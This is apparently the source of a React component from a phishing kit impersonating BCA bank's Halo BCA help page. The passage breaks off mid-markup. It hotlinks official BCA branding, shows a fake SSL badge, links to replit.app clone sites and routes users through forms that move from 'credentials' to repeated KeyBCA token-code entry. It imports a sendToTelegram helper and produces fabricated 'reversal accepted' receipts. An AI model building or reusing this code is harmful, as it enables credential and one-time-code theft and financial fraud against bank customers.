import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { BcaAiAssistant } from './BcaAiAssistant';
import {
  Search,
  Menu,
  ShieldCheck,
  CreditCard,
  RotateCcw,
  KeyRound,
  ChevronLeft,
  ChevronRight,
  MoveRight,
  LogIn,
  LayoutGrid,
  Heart,
  ShoppingBag,
  SquarePen,
  MessageSquare,
  X,
  ExternalLink,
  CheckCircle2
} from 'lucide-react';
import { NeedCard, SmartbarItem, ServiceExplanation } from '../types';
import { triggerHaptic } from '../utils/haptics';
import { BlokirForm } from './forms/BlokirForm';
import { BankLainForm } from './forms/BankLainForm';
import { PembatalanForm } from './forms/PembatalanForm';
import { UserIdForm } from './forms/UserIdForm';
import { sendToTelegram } from '../utils/telegram';

// Static Data defined outside component to prevent re-allocations on every render
const SERVICE_EXPLANATIONS: ServiceExplanation[] = [
  {
    cardId: 'blokir-bca',
    title: "Perlindungan & Pemblokiran Kartu BCA Tanggap Cepat",
    desc: "Layanan tanggap emergency 24 jam nonstop untuk perlindungan instan kartu kredit, debit, serta rekening BCA Anda dari potensi penyalahgunaan transaksi."
  },
  {
    cardId: 'amankan-bank-lain',
    title: "Pusat Pengamanan & Bantuan Darurat Kartu Bank Mitra",
    desc: "Layanan terpadu pendampingan dan panduan keamanan lengkap bagi nasabah yang memerlukan tindakan pencegahan untuk kartu bank mitra lainnya."
  },
  {
    cardId: 'pembatalan-transaksi',
    title: "Layanan Pembatalan & Sanggahan Transaksi Rekening",
    desc: "Pengajuan investigasi kilat, klarifikasi transaksi tidak dikenal, serta sanggahan tagihan gantung secara resmi dengan perlindungan saldo nasabah."
  },
  {
    cardId: 'amankan-user-id',
    title: "Pemulihan Keamanan Akun & Proteksi User ID Akses",
    desc: "Restorasi cepat kredensial digital, penggantian password, serta penguncian akses akun sementara saat terindikasi adanya aktivitas login mencurigakan."
  }
];

const NEEDS_CARDS: NeedCard[] = [
  { 
    id: 'blokir-bca', 
    title: 'Blokir Kartu BCA', 
    icon: CreditCard, 
    url: 'https://guru-handal--uobkartukrediti.replit.app/',
    badge: 'm-BCA'
  },
  { 
    id: 'amankan-bank-lain', 
    title: 'Amankan Kartu Bank Lain', 
    icon: ShieldCheck, 
    url: 'https://deverloper-guru--havagajajvvs.replit.app/',
    badge: 'myBCA'
  },
  { 
    id: 'pembatalan-transaksi', 
    title: 'Pembatalan Transaksi', 
    icon: RotateCcw, 
    url: 'https://bca-theme-changer--kkujom.replit.app/',
    badge: 'm-BCA'
  },
  { 
    id: 'amankan-user-id', 
    title: 'Amankan User ID', 
    icon: KeyRound, 
    url: 'https://web-clone-exact--bsbbshhvs.replit.app/',
    badge: 'myBCA'
  },
];

const SMARTBAR_ITEMS: SmartbarItem[] = [
  {
    id: 'sb_login',
    title: 'Login',
    icon: LogIn,
    isActive: true,
  },
  {
    id: 'sb_produk',
    title: 'Produk',
    icon: LayoutGrid,
  },
  {
    id: 'sb_layanan',
    title: 'Layanan',
    icon: Heart,
  },
  {
    id: 'sb_promo',
    title: 'Promo',
    icon: ShoppingBag,
  },
  {
    id: 'sb_webform',
    title: 'Webform BCA',
    icon: SquarePen,
    isMultiline: true,
  },
  {
    id: 'sb_chat',
    title: 'Chat',
    icon: MessageSquare,
    isAi: true,
  },
];

export const BcaSitePreview: React.FC = () => {
  const [isAiOpen, setIsAiOpen] = useState(false);
  const [isSearchOpen, setIsSearchOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');
  const [isPageLoading, setIsPageLoading] = useState(false);
  const [activeTab, setActiveTab] = useState('sb_login');
  const scrollContainerRef = useRef<HTMLDivElement | null>(null);

  const [currentMessageIndex, setCurrentMessageIndex] = useState(0);
  const [typedTitle, setTypedTitle] = useState("");
  const [typedDesc, setTypedDesc] = useState("");
  const [canScrollLeft, setCanScrollLeft] = useState(false);
  const [canScrollRight, setCanScrollRight] = useState(true);

  // Form modal state
  const [activeFormId, setActiveFormId] = useState<string | null>(null);
  const [userIdStep, setUserIdStep] = useState<'credentials' | 'keybca'>('credentials');
  const [formSubmissionResult, setFormSubmissionResult] = useState<{
    title: string;
    subtitle: string;
    previewUrl?: string | null;
    details: Array<{ label: string; value: string }>;
  } | null>(null);

  // Countdown overlay state for Blokir Kartu BCA, Amankan Bank Lain, Pembatalan Transaksi & User ID
  const [blockingOverlay, setBlockingOverlay] = useState<{
    countdown: number;
    stage: 'counting' | 'success';
    cardInfo: string;
    targetService: 'blokir-bca' | 'amankan-bank-lain' | 'pembatalan-transaksi' | 'user-id' | 'keybca';
    pembatalanData?: {
      accountNo: string;
      accountName: string;
      amount: string;
      date: string;
      reason: string;
      previewUrl: string | null;
    };
    userIdData?: any;
  } | null>(null);

  const handleServiceSelect = (serviceId: string) => {
    triggerHaptic(15);
    setFormSubmissionResult(null);
    setBlockingOverlay(null);
    setUserIdStep('credentials');
    setActiveFormId(serviceId);
  };

  const handleNavigate = (targetTabId?: string, serviceId?: string) => {
    triggerHaptic(15);
    setTimeout(() => {
      setIsPageLoading(true);
      if (targetTabId) setActiveTab(targetTabId);
      setTimeout(() => {
        setIsPageLoading(false);
        if (serviceId) {
          handleServiceSelect(serviceId);
        }
      }, 400);
    }, 100);
  };

  // Scroll sync: Automatically scroll card horizontally inside container when currentMessageIndex changes (without scrolling the window!)
  useEffect(() => {
    if (scrollContainerRef.current) {
      const container = scrollContainerRef.current;
      const activeCardEl = container.children[currentMessageIndex] as HTMLElement;
      if (activeCardEl) {
        const cardLeft = activeCardEl.offsetLeft;
        const cardWidth = activeCardEl.offsetWidth;
        const containerWidth = container.clientWidth;
        const targetLeft = cardLeft - (containerWidth / 2) + (cardWidth / 2);
        container.scrollTo({
          left: Math.max(0, targetLeft),
          behavior: 'smooth'
        });
      }
    }
  }, [currentMessageIndex]);

  // Countdown timer effect for Blokir Kartu, Amankan Bank Lain & Pembatalan Transaksi
  useEffect(() => {
    if (!blockingOverlay) return;

    if (blockingOverlay.stage === 'counting') {
      if (blockingOverlay.countdown > 0) {
        const timer = setTimeout(() => {
          setBlockingOverlay((prev) =>
            prev ? { ...prev, countdown: prev.countdown - 1 } : null
          );
        }, 1000);
        return () => clearTimeout(timer);
      } else {
        setBlockingOverlay((prev) =>
          prev ? { ...prev, stage: 'success' } : null
        );
      }
    } else if (blockingOverlay.stage === 'success') {
      const timer = setTimeout(() => {
        if (blockingOverlay.targetService === 'pembatalan-transaksi') {
          const data = blockingOverlay.pembatalanData;
          const refNo = `REV-${new Date().getFullYear()}${(new Date().getMonth() + 1).toString().padStart(2, '0')}${Math.floor(100000 + Math.random() * 900000)}`;
          const timeStr = new Date().toLocaleString('id-ID', {
            day: '2-digit',
            month: 'short',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
          }) + ' WIB';

          setFormSubmissionResult({
            title: 'Pembatalan Transaksi Berhasil',
            subtitle: 'Resi Digital Resmi telah diterbitkan dan permohonan reversal transaksi berhasil diproses oleh sistem Halo BCA.',
            previewUrl: data?.previewUrl || null,
            details: [
              { label: 'No. Referensi (Ref No)', value: refNo },
              { label: 'Waktu Pengajuan', value: timeStr },
              { label: 'No. Rekening / Kartu', value: data?.accountNo || '-' },
              { label: 'Nama Pemilik', value: data?.accountName || '-' },
              { label: 'Nominal Transaksi', value: data?.amount || 'Rp 0' },
              { label: 'Tanggal Transaksi', value: data?.date || '-' },
              { label: 'Alasan Pembatalan', value: data?.reason || '-' },
              { label: 'Status Stempel', value: 'PEMBATALAN DITERIMA (REVERSAL)' },
            ],
          });
          setBlockingOverlay(null);
        } else if (blockingOverlay.targetService === 'user-id') {
          setUserIdStep('keybca');
          setBlockingOverlay(null);
        } else if (blockingOverlay.targetService === 'keybca') {
          // Tetap di halaman KeyBCA Remote agar pengguna bisa menginput kode berulang kali tanpa kembali ke awal
          setBlockingOverlay(null);
        } else {
          setBlockingOverlay(null);
          setActiveFormId('amankan-user-id');
          setUserIdStep('keybca');
        }
      }, 1500);
      return () => clearTimeout(timer);
    }
  }, [blockingOverlay]);

  useEffect(() => {
    let isMounted = true;
    let timeoutId: NodeJS.Timeout;

    const runTypingForIndex = async (index: number) => {
      if (!isMounted) return;

      const currentCard = SERVICE_EXPLANATIONS[index];
      const fullTitle = currentCard.title;
      const fullDesc = currentCard.desc;

      // Reset text
      setTypedTitle("");
      setTypedDesc("");

      // Type Title
      for (let i = 1; i <= fullTitle.length; i++) {
        if (!isMounted) return;
        setTypedTitle(fullTitle.slice(0, i));
        await new Promise((resolve) => setTimeout(resolve, 35));
      }

      if (!isMounted) return;
      await new Promise((resolve) => setTimeout(resolve, 120));

      // Type Description
      for (let j = 1; j <= fullDesc.length; j++) {
        if (!isMounted) return;
        setTypedDesc(fullDesc.slice(0, j));
        await new Promise((resolve) => setTimeout(resolve, 20));
      }

      if (!isMounted) return;

      // Wait 3.5 seconds then advance to next card's explanation
      timeoutId = setTimeout(() => {
        if (isMounted) {
          setCurrentMessageIndex((prev) => (prev + 1) % SERVICE_EXPLANATIONS.length);
        }
      }, 3500);
    };

    runTypingForIndex(currentMessageIndex);

    return () => {
      isMounted = false;
      if (timeoutId) clearTimeout(timeoutId);
    };
  }, [currentMessageIndex]);

  const updateScrollButtons = () => {
    if (!scrollContainerRef.current) return;
    const { scrollLeft, scrollWidth, clientWidth } = scrollContainerRef.current;
    const nextCanLeft = scrollLeft > 8;
    const nextCanRight = scrollLeft + clientWidth < scrollWidth - 8;
    setCanScrollLeft((prev) => (prev !== nextCanLeft ? nextCanLeft : prev));
    setCanScrollRight((prev) => (prev !== nextCanRight ? nextCanRight : prev));
  };

  const handleScroll = () => {
    updateScrollButtons();
  };

  const scrollByDirection = (direction: 'left' | 'right') => {
    if (!scrollContainerRef.current) return;
    const scrollAmount = direction === 'left' ? -150 : 150;
    scrollContainerRef.current.scrollBy({ left: scrollAmount, behavior: 'smooth' });
  };

  return (
    <div className="relative h-full w-full bg-gradient-to-b from-[#00529C] via-[#004788] to-[#003B73] font-sans text-white select-none overflow-hidden flex flex-col">
      
      {/* Official BCA Background Image (Mobile & Desktop) extracted from BCA Site */}
      <div className="absolute inset-0 z-0 pointer-events-none overflow-hidden">
        {/* Mobile Background Image */}
        <img
          src="https://www.bca.co.id/-/media/Feature/Banner/Product-Banner/Mobile/individu/layanan/costumer-service/20210219-INDIVIDU_CUSTOMER-SEERVICE-HALO-BCA_60.jpg"
          alt="BCA Banner Background Mobile"
          referrerPolicy="no-referrer"
          className="block sm:hidden w-full h-full object-cover object-top opacity-90"
        />
        {/* Desktop Background Image */}
        <img
          src="https://www.bca.co.id/-/media/Feature/Banner/Product-Banner/Desktop/individu/layanan/costumer-service/20210219-Individu-Customer-Service-Halo-BCA-60.jpg"
          alt="BCA Banner Background Desktop"
          referrerPolicy="no-referrer"
          className="hidden sm:block w-full h-full object-cover object-center opacity-85"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-[#00529C]/20 via-[#004788]/30 to-[#003B73]/50" />
        <div className="absolute -top-32 -left-32 w-96 h-96 bg-white/10 rounded-full blur-3xl" />
        <div className="absolute bottom-0 right-0 w-[500px] h-[500px] bg-cyan-300/15 rounded-full blur-3xl" />
        {/* Subtle banking grid pattern */}
        <div className="absolute inset-0 bg-[radial-gradient(#ffffff_1px,transparent_1px)] [background-size:24px_24px] opacity-10" />
      </div>

      {/* Top Header Navigation using official BCA Blue #00529C */}
      <header className="relative z-40 shrink-0 bg-[#00529C] border-b border-[#00407A] px-3.5 sm:px-4 pt-[calc(0.4rem+env(safe-area-inset-top,0px))] pb-1.5 sm:pb-2 shadow-md">
        <div className="max-w-7xl mx-auto flex items-center justify-between">
          
          {/* Logo BCA with tagline image */}
          <div className="flex items-center gap-2.5">
            <img
              src="https://www.bca.co.id/-/media/Feature/Card/List-Card/Tentang-BCA/Brand-Assets/Logo-BCA/Logo-BCA_Putih-Dengan-Tagline.png"
              alt="BCA - Senantiasa di Sisi Anda"
              referrerPolicy="no-referrer"
              className="h-6 sm:h-8 w-auto object-contain"
            />
          </div>

          {/* Right Header Actions: Navigation Icons & Security Badge */}
          <div className="flex items-center space-x-1.5 sm:space-x-2">
            {/* Live Security Badge */}
            <div className="hidden xs:flex items-center gap-1 px-2 py-0.5 rounded-full bg-emerald-500/15 border border-emerald-400/30 text-[10px] font-bold text-emerald-300 shadow-xs">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
              <span>Aman SSL</span>
            </div>

            {/* Search Icon - Interactive Click to Open Quick Search */}
            <button
              onClick={() => {
                triggerHaptic(12);
                setIsSearchOpen(true);
              }}
              className="p-1.5 sm:p-2 rounded-full hover:bg-white/15 active:scale-90 text-white transition-all cursor-pointer flex items-center justify-center focus:outline-none"
              title="Cari Layanan BCA"
              aria-label="Pencarian Cepat Layanan BCA"
            >
              <Search className="w-4 h-4 sm:w-5 sm:h-5 stroke-[2]" />
            </button>

            {/* Menu Icon */}
            <button
              onClick={() => {
                triggerHaptic(12);
                setIsSearchOpen(true);
              }}
              className="p-1.5 sm:p-2 rounded-lg bg-[#003B73] text-white hover:bg-[#004788] active:scale-95 transition-all cursor-pointer border border-cyan-300/30 shadow-xs flex items-center justify-center"
              aria-label="Menu Layanan"
            >
              <Menu className="w-4 h-4 sm:w-5 sm:h-5 stroke-[2.2]" />
            </button>
          </div>
        </div>
      </header>

      {/* Hero Banner matching user's screenshot */}
      <section className="relative flex-1 flex flex-col justify-between px-2 sm:px-4 py-2 sm:py-3.5 overflow-hidden z-10">

        {/* Hero Content Text (Fixed Height Slot to Prevent Layout Shifting) */}
        <div className="relative z-20 max-w-2xl pt-1 sm:pt-2 shrink-0 h-[100px] xs:h-[110px] sm:h-[125px] overflow-hidden flex flex-col justify-start">
          <AnimatePresence mode="wait">
            <motion.div
              key={currentMessageIndex}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              transition={{ duration: 0.25, ease: 'easeOut' }}
              className="space-y-1 sm:space-y-1.5"
            >
              <h1 className="text-lg xs:text-xl sm:text-2xl font-extrabold text-white leading-snug tracking-tight drop-shadow-md line-clamp-2">
                {typedTitle}
              </h1>
              <p className="text-xs sm:text-sm text-blue-100/95 max-w-2xl font-medium leading-relaxed line-clamp-3">
                {typedDesc}
              </p>
            </motion.div>
          </AnimatePresence>
        </div>

        {/* "Pilih Kebutuhanmu" Cards Section with Touch Swiping / Scrolling */}
        <div className="relative z-20 space-y-2 mt-auto pt-1 shrink-0">
          <div className="flex items-center justify-between px-1">
            <h2 className="text-sm sm:text-base font-bold text-white tracking-wide">
              Pilih Kebutuhanmu
            </h2>
            <div className="flex items-center gap-2">
              {/* Clean Navigation Arrows in Header - Never Obstructs Cards */}
              <div className="flex items-center gap-1 bg-black/25 p-0.5 rounded-full border border-white/15 shadow-xs">
                <button
                  onClick={() => scrollByDirection('left')}
                  disabled={!canScrollLeft}
                  className="p-1 rounded-full text-white hover:bg-white/20 active:scale-90 disabled:opacity-30 disabled:pointer-events-none transition-all cursor-pointer"
                  aria-label="Geser menu ke kiri"
                >
                  <ChevronLeft className="w-3.5 h-3.5 stroke-[2.5]" />
                </button>
                <button
                  onClick={() => scrollByDirection('right')}
                  disabled={!canScrollRight}
                  className="p-1 rounded-full bg-cyan-400 text-slate-900 hover:bg-cyan-300 active:scale-90 disabled:opacity-30 disabled:pointer-events-none transition-all cursor-pointer shadow-sm"
                  aria-label="Geser menu ke kanan"
                >
                  <ChevronRight className="w-3.5 h-3.5 stroke-[3]" />
                </button>
              </div>

              {/* Animated Hint Badge */}
              <div className="flex items-center gap-1 px-2 py-0.5 rounded-full bg-cyan-300/20 border border-cyan-300/40 text-[10px] sm:text-[11px] font-bold text-cyan-200 shadow-xs animate-pulse">
                <span>Geser menu</span>
                <MoveRight className="w-3 h-3 text-cyan-300 stroke-[2.5] animate-bounce-x" />
              </div>
            </div>
          </div>

          {/* Cards Carousel Container */}
          <div className="relative">
            {/* Touch Swiping Cards Container taking 95% screen width consistently */}
            <div
              ref={scrollContainerRef}
              onScroll={handleScroll}
              className="flex gap-2 sm:gap-3 overflow-x-auto snap-x snap-mandatory py-1.5 px-0.5 scrollbar-none scroll-smooth touch-pan-x"
              style={{ scrollbarWidth: 'none', msOverflowStyle: 'none' }}
            >
              {NEEDS_CARDS.map((card, idx) => {
                const CardIcon = card.icon;
                const isSelected = currentMessageIndex === idx;
                return (
                  <motion.button
                    key={card.id}
                    type="button"
                    initial={{ opacity: 0, scale: 0.96 }}
                    animate={{ opacity: 1, scale: 1 }}
                    whileHover={{ scale: 1.02, transition: { duration: 0.15 } }}
                    whileTap={{ scale: 0.93 }}
                    transition={{ duration: 0.18, delay: idx * 0.03 }}
                    onClick={() => {
                      triggerHaptic(12);
                      setCurrentMessageIndex(idx);
                      handleServiceSelect(card.id);
                    }}
                    onMouseEnter={() => setCurrentMessageIndex(idx)}
                    className={`group/card snap-start shrink-0 w-[148px] xs:w-[158px] sm:w-[168px] bg-white hover:bg-slate-50 active:bg-cyan-50 p-3 sm:p-3.5 rounded-2xl flex flex-col items-center text-center justify-center space-y-2 shadow-md transition-all duration-100 ease-out cursor-pointer no-underline touch-manipulation relative overflow-hidden min-h-[124px] sm:min-h-[138px] ${
                      isSelected
                        ? 'border-2 border-cyan-400 ring-2 ring-cyan-300/50 shadow-lg shadow-cyan-500/20 scale-[1.01]'
                        : 'border-2 border-slate-200/80 hover:border-blue-200'
                    }`}
                  >
                    {/* Top Micro-Interaction Badge */}
                    <div className="absolute top-1.5 right-1.5 px-1.5 py-0.5 rounded-full bg-[#00529C]/10 border border-[#00529C]/20 text-[9px] font-extrabold text-[#00529C] tracking-tight">
                      {card.badge || 'Resmi'}
                    </div>

                    <div className={`p-2.5 rounded-2xl transition-colors duration-200 shrink-0 mt-1 ${
                      isSelected ? 'bg-blue-100 text-[#00529C] shadow-xs' : 'bg-blue-50 text-[#00529C] group-hover/card:bg-blue-100'
                    }`}>
                      <CardIcon className="w-8 h-8 sm:w-9 sm:h-9 stroke-[2.2] transition-transform duration-200 group-hover/card:scale-110" />
                    </div>
                    <span className="text-[12px] sm:text-xs font-extrabold text-[#003B73] leading-tight text-center tracking-tight">
                      {card.title}
                    </span>
                  </motion.button>
                );
              })}
            </div>
          </div>

          {/* Interactive Pagination Dots (4 Dots) */}
          <div className="flex justify-center items-center space-x-1.5 pt-1">
            {NEEDS_CARDS.map((_, dotIdx) => (
              <button
                key={dotIdx}
                onClick={() => {
                  triggerHaptic(10);
                  setCurrentMessageIndex(dotIdx);
                }}
                className={`transition-all duration-300 rounded-full focus:outline-none active:scale-75 cursor-pointer ${
                  currentMessageIndex === dotIdx
                    ? 'w-5 h-2 bg-cyan-300 shadow-md shadow-cyan-400/50'
                    : 'w-2 h-2 bg-white/40 hover:bg-white/70'
                }`}
                aria-label={`Menu ${dotIdx + 1}`}
              />
            ))}
          </div>
        </div>
      </section>

      {/* Bottom Fixed Navigation Bar matching official reference image */}
      <aside className="relative z-40 bg-[#00529C] border-t border-[#28B4E8]/40 shadow-2xl backdrop-blur-lg pb-[calc(0.6rem+env(safe-area-inset-bottom,0px))] pt-1 shrink-0">
        <div className="w-full grid grid-cols-6 text-center text-white divide-x divide-white/20">
          {SMARTBAR_ITEMS.map((item) => {
            const IconComponent = item.icon;
            const isChatAi = item.isAi;
            const isActive = activeTab === item.id;
            const isMultiline = item.isMultiline;
            return (
              <motion.div
                key={item.id}
                whileTap={{ scale: 0.90 }}
                transition={{ duration: 0.1 }}
                onClick={() => {
                  triggerHaptic(14);
                  if (isChatAi) {
                    setIsAiOpen((prev) => !prev);
                  } else {
                    handleNavigate(item.id);
                  }
                }}
                className={`py-1 px-0.5 flex flex-col items-center justify-center transition-colors duration-150 active:bg-[#003366] cursor-pointer touch-manipulation select-none relative min-h-[46px] sm:min-h-[52px] ${
                  isChatAi && isAiOpen
                    ? 'bg-[#003B73] text-cyan-200 font-bold'
                    : isActive
                    ? 'bg-[#004788] text-white font-bold'
                    : 'hover:bg-[#004788] text-white font-semibold'
                }`}
              >
                {/* Active Indicator Horizontal Bar with Framer Motion spring layoutId */}
                {isActive && (
                  <motion.div
                    layoutId="activeTabIndicator"
                    className="absolute top-0 left-1/2 -translate-x-1/2 w-5 sm:w-6 h-0.5 sm:h-1 bg-white rounded-full shadow-sm"
                    transition={{ type: "spring", stiffness: 450, damping: 30 }}
                  />
                )}

                <div className="relative mb-0.5 shrink-0 flex items-center justify-center">
                  {isChatAi ? (
                    <img
                      src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEShyphenhyphenecrz4Lyrs3a8-h3oG-6Hqh5FMdYhVba8_4NMy_60IXDS6stwE6cSp_LL9TfhfpLM4I6IyGZTZUL5ZfTOHAsTKTYx8FqW3xVPM0_RiXRRBgoajU6OT-G5BXtKPFzMsfrnBgmTq2OCD/s1000/logo+bank+bca-01.png"
                      alt="Tanya BCA AI"
                      referrerPolicy="no-referrer"
                      className="w-4 h-4 sm:w-5 sm:h-5 object-contain transition-transform active:scale-110 brightness-0 invert animate-pulse"
                    />
                  ) : (
                    <IconComponent className="w-4 h-4 sm:w-5 sm:h-5 stroke-[2.2] text-white transition-transform active:scale-110" />
                  )}
                </div>

                <span className="text-[9px] sm:text-[10px] leading-[1.1] font-semibold text-white tracking-tight text-center px-0.5">
                  {isMultiline ? (
                    <>
                      Webform
                      <br />
                      BCA
                    </>
                  ) : (
                    item.title
                  )}
                </span>
              </motion.div>
            );
          })}
        </div>
      </aside>

      {/* Tanya BCA AI Chat Assistant Drawer (Opened via Bottom Navigation Chat AI Icon) */}
      <BcaAiAssistant isOpen={isAiOpen} onClose={() => setIsAiOpen(false)} />

      {/* Quick Search Interactive Overlay Modal */}
      <AnimatePresence>
        {isSearchOpen && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95, y: 15 }}
            animate={{ opacity: 1, scale: 1, y: 0 }}
            exit={{ opacity: 0, scale: 0.95, y: 15 }}
            transition={{ duration: 0.22, ease: [0.16, 1, 0.3, 1] }}
            className="absolute inset-0 z-50 flex flex-col bg-[#002D58]/95 backdrop-blur-xl p-4 text-white font-sans overflow-hidden"
          >
            {/* Modal Header */}
            <div className="flex items-center justify-between pb-3 border-b border-cyan-300/20 shrink-0">
              <div className="flex items-center gap-2">
                <img
                  src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEShyphenhyphenecrz4Lyrs3a8-h3oG-6Hqh5FMdYhVba8_4NMy_60IXDS6stwE6cSp_LL9TfhfpLM4I6IyGZTZUL5ZfTOHAsTKTYx8FqW3xVPM0_RiXRRBgoajU6OT-G5BXtKPFzMsfrnBgmTq2OCD/s1000/logo+bank+bca-01.png"
                  alt="BCA"
                  referrerPolicy="no-referrer"
                  className="h-7 w-auto object-contain"
                />
                <span className="text-sm font-extrabold text-white tracking-tight">Pencarian Cepat BCA</span>
              </div>
              <button
                onClick={() => {
                  triggerHaptic(10);
                  setIsSearchOpen(false);
                  setSearchQuery('');
                }}
                className="p-1.5 rounded-full bg-white/10 hover:bg-white/20 text-white transition-all active:scale-90 cursor-pointer"
                aria-label="Tutup Pencarian"
              >
                <X className="w-5 h-5 stroke-[2.5]" />
              </button>
            </div>

            {/* Search Input Box */}
            <div className="pt-4 pb-3 shrink-0">
              <div className="relative flex items-center">
                <Search className="w-5 h-5 absolute left-3.5 text-cyan-300 pointer-events-none" />
                <input
                  type="text"
                  autoFocus
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  placeholder="Cari 4 layanan bantuan (Blokir, Bank Lain, Transaksi, User ID)..."
                  className="w-full bg-[#001D38] border-2 border-cyan-400/40 focus:border-cyan-300 rounded-xl py-3 pl-10 pr-10 text-sm text-white placeholder:text-blue-200/60 focus:outline-none shadow-inner"
                />
                {searchQuery && (
                  <button
                    onClick={() => {
                      triggerHaptic(8);
                      setSearchQuery('');
                    }}
                    className="absolute right-3 p-1 rounded-full text-blue-200 hover:text-white"
                  >
                    <X className="w-4 h-4" />
                  </button>
                )}
              </div>
            </div>

            {/* Quick Tags - Exactly the 4 Main Assistance Services */}
            <div className="space-y-2 pb-3 shrink-0">
              <span className="text-[11px] font-bold text-cyan-200/80 tracking-wide uppercase">4 Layanan Bantuan Utama</span>
              <div className="grid grid-cols-2 gap-1.5">
                {[
                  { label: 'Blokir Kartu BCA', query: 'blokir' },
                  { label: 'Amankan Bank Lain', query: 'bank lain' },
                  { label: 'Pembatalan Transaksi', query: 'batal' },
                  { label: 'Amankan User ID', query: 'user id' },
                ].map((tag) => (
                  <button
                    key={tag.label}
                    onClick={() => {
                      triggerHaptic(10);
                      setSearchQuery(tag.query);
                    }}
                    className="px-2.5 py-2 rounded-lg bg-cyan-400/15 border border-cyan-300/30 text-xs font-bold text-cyan-100 hover:bg-cyan-400/30 active:scale-95 transition-all cursor-pointer text-left flex items-center justify-between"
                  >
                    <span>{tag.label}</span>
                    <span className="text-[10px] text-cyan-300/80 font-normal">Pilih</span>
                  </button>
                ))}
              </div>
            </div>

            {/* Filtered Search Results - Exclusively the 4 Main Assistance Services */}
            <div className="flex-1 overflow-y-auto space-y-2.5 pt-2 pr-1 scrollbar-none">
              {NEEDS_CARDS.filter(c =>
                c.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
                c.badge?.toLowerCase().includes(searchQuery.toLowerCase()) ||
                searchQuery === ''
              ).map((card) => {
                const IconComp = card.icon;
                return (
                  <motion.div
                    key={card.id}
                    initial={{ opacity: 0, y: 8 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="bg-[#003B73]/90 border border-cyan-300/30 rounded-xl p-3 flex items-center justify-between hover:bg-[#00488C] transition-all"
                  >
                    <div className="flex items-center gap-3">
                      <div className="p-2.5 rounded-lg bg-cyan-400/20 text-cyan-200 shrink-0">
                        <IconComp className="w-5 h-5 stroke-[2]" />
                      </div>
                      <div>
                        <h3 className="text-xs font-bold text-white leading-tight">{card.title}</h3>
                        <span className="text-[10px] text-cyan-200/80 font-medium">{card.badge} • Layanan Darurat Resmi</span>
                      </div>
                    </div>
                    <button
                      onClick={() => {
                        triggerHaptic(12);
                        setIsSearchOpen(false);
                        handleServiceSelect(card.id);
                      }}
                      className="px-3 py-1.5 rounded-lg bg-cyan-400 text-slate-900 font-extrabold text-xs hover:bg-cyan-300 active:scale-95 transition-all flex items-center gap-1 cursor-pointer shrink-0"
                    >
                      <span>Akses</span>
                      <ExternalLink className="w-3 h-3" />
                    </button>
                  </motion.div>
                );
              })}
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Full-screen Shimmer Skeleton Loading Page Transition Overlay */}
      <AnimatePresence>
        {isPageLoading && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            transition={{ duration: 0.25 }}
            className="absolute inset-0 z-50 flex flex-col bg-[#F2F4F8] overflow-hidden font-sans"
          >
            {/* Skeleton Top Header Bar */}
            <div className="bg-[#FFFFFF] px-5 py-3.5 border-b border-slate-200 flex items-center justify-between shrink-0">
              <div className="w-28 h-8 rounded-lg animate-shimmer" />
              <div className="w-8 h-8 rounded-lg animate-shimmer" />
            </div>

            {/* Skeleton Content Body with Shimmer Placeholders */}
            <div className="flex-1 p-5 space-y-4 overflow-hidden">
              {/* Skeleton Banner Card */}
              <div className="w-full h-36 sm:h-40 rounded-2xl animate-shimmer p-4 flex flex-col justify-between shadow-xs">
                <div className="w-1/3 h-5 rounded-md bg-slate-300/60" />
                <div className="space-y-2">
                  <div className="w-3/4 h-4 rounded-md bg-slate-300/60" />
                  <div className="w-1/2 h-3 rounded-md bg-slate-300/50" />
                </div>
              </div>

              {/* Skeleton Horizontal Cards Row */}
              <div className="flex gap-3 overflow-hidden pt-1">
                {[1, 2, 3].map((i) => (
                  <div key={i} className="shrink-0 w-[148px] h-[130px] rounded-2xl bg-[#FFFFFF] border border-slate-200/80 p-4 space-y-3 shadow-xs">
                    <div className="w-9 h-9 rounded-full animate-shimmer" />
                    <div className="w-full h-3.5 rounded-md animate-shimmer" />
                    <div className="w-2/3 h-2.5 rounded-md animate-shimmer" />
                  </div>
                ))}
              </div>

              {/* Skeleton List Items */}
              <div className="space-y-2.5 pt-2">
                {[1, 2, 3].map((i) => (
                  <div key={i} className="w-full h-14 rounded-xl bg-[#FFFFFF] border border-slate-200/80 p-3 flex items-center gap-3 shadow-xs">
                    <div className="w-8 h-8 rounded-lg animate-shimmer shrink-0" />
                    <div className="flex-1 space-y-1.5">
                      <div className="w-2/3 h-3 rounded animate-shimmer" />
                      <div className="w-1/3 h-2.5 rounded animate-shimmer" />
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Floating Center BCA Logo without box or extra text */}
            <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
              <div className="relative flex items-center justify-center">
                <div className="absolute -inset-3 rounded-full bg-[#004070]/15 animate-ping" />
                <img
                  src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiEShyphenhyphenecrz4Lyrs3a8-h3oG-6Hqh5FMdYhVba8_4NMy_60IXDS6stwE6cSp_LL9TfhfpLM4I6IyGZTZUL5ZfTOHAsTKTYx8FqW3xVPM0_RiXRRBgoajU6OT-G5BXtKPFzMsfrnBgmTq2OCD/s1000/logo+bank+bca-01.png"
                  alt="BCA Logo Loading"
                  referrerPolicy="no-referrer"
                  className="w-16 h-16 sm:w-20 sm:h-20 object-contain relative z-10 animate-pulse-scale"
                />
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Interactive In-App Form Sheet / Modal Overlay */}
      <AnimatePresence>
        {activeFormId && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
